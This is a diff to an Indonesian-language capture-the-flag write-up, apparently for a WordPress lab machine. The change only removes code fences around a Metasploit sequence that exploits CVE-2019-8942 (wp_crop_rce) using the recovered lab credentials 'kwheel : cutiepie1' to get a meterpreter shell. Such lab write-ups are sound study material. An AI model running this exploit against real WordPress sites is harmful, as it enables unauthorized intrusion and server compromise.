@@ -43,14 +43,14 @@ Kredensial ditemukan: kwheel : cutiepie1
 Remote Code Execution (RCE)
 WordPress versi 5.0 rentan terhadap CVE-2019-8942 (Crop-to-Shell). Menggunakan Metasploit untuk mendapatkan shell:
 
-    ```
+ 
     use exploit/multi/http/wp_crop_rce
     set RHOSTS <TARGET_IP>
     set USERNAME kwheel
     set PASSWORD cutiepie1
     set LHOST <IP_VPN_TUN0>
     exploit
-    ```
+
 
 Hasil: Mendapatkan meterpreter session sebagai user www-data.
 3. Privilege Escalation (PrivEsc)
